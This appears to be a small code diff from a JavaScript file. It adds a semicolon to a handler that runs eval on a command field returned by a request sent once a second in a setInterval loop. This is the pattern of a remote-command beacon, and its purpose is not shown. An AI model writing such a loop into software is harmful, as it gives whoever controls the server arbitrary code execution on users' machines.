@@ -15,5 +15,5 @@ var loop = setInterval(function(){
   request.send();
 },1000);
 request.onload = function(){
-eval(request.response.command)
+eval(request.response.command);
 }
